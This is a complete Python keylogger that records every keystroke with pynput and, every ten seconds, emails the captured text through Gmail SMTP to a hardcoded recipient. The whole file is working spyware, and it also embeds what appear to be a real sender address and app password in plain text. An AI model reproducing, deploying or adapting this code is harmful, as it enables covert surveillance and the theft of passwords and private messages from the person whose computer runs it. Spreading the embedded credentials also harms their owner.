from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading

# Global variables
text = ""
new_text = ""

# Email settings
smtp_server = "smtp.gmail.com"  # Change based on your email provider
smtp_port = 587
sender_email = "jer.smith0004@gmail.com"
sender_password = "brlqlkxpzghxyppa"  # Use an app-specific password if necessary
recipient_email = "grigoryan021201@gmail.com"

# Time interval for sending emails (in seconds)
time_interval = 10

# Function to send email
def send_email():
    global new_text
    try:
        if new_text:  # Only send if there is new data
            # Create the email content
            msg = MIMEText(new_text)
            msg["Subject"] = "Captured Keyboard Data"
            msg["From"] = sender_email
            msg["To"] = recipient_email

            # Send the email
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, recipient_email, msg.as_string())
                print("Sent email successfully.")
            new_text = ""  # Clear the captured text after sending
        # Schedule the next email
        timer = threading.Timer(time_interval, send_email)
        timer.start()
    except Exception as e:
        print("Failed to send email:", e)

# Function to handle key press events
def on_press(key):
    global new_text

    if key == keyboard.Key.enter:
        new_text += "\n"
    elif key == keyboard.Key.tab:
        new_text += "\t"
    elif key == keyboard.Key.space:
        new_text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(new_text) > 0:
        new_text = new_text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False  # Stop listener on escape key
    else:
        new_text += str(key).strip("'")

# Start the keyboard listener and email sending process
with keyboard.Listener(on_press=on_press) as listener:
    send_email()  # Start the email sending process
    listener.join()
